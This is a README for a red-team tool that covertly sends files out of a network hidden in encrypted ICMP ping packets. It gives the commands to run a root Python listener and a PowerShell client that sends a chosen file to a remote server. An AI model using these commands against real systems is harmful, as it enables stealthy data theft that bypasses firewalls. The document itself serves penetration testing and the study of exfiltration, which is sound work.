> **Covert ICMP-based file exfiltration tool**  
> Encrypted file transfer over ICMP echo requests for stealthy data smuggling.

## Overview

PingMeMaybe is a stealthy, encrypted file exfiltration tool leveraging ICMP echo request packets (ping) to covertly transmit files between a Windows client (PowerShell) and a server (Python).  
This tool is designed for red teamers and penetration testers who want to simulate data exfiltration via ICMP â€” a commonly allowed protocol that can bypass many firewall rules.

## Installation

### Server Requirements

- Python 3.7+
- Required Python packages:
  - `cryptography`
  - `rich`

### Download
Clone the repository or download the scripts manually:
```bash
git clone https://github.com/MAXIVA11/PingMeMaybe.git
cd PingMeMaybe
```
 
## Usage

### Server

Run the Python server script with root privileges to listen for incoming ICMP packets:

```bash
sudo python3 ping_smuggler_server.py
```
On startup, the server will generate and display a random AES-GCM key.
Copy this key exactly as shown â€” you will need it on the client side.

### Client

Run the PowerShell client script on a Windows machine with the following parameters:

```powershell
.\Invoke-PingSmuggler.ps1 -Target <Server_IP> -File <Path_to_File> -HexKey <AES-GCM_Key>
```
- **Target**: The IP address of the machine running the server.

- **File**: The full path to the file you want to exfiltrate.

- **HexKey**: The AES-GCM key generated by the server (copy-paste exactly).

### Notes

- PowerShell 7+ is recommended for AES-GCM support; if unavailable, the script falls back to AES-CBC+HMAC encryption.

- Make sure ICMP echo requests are allowed through firewalls on both client and serve
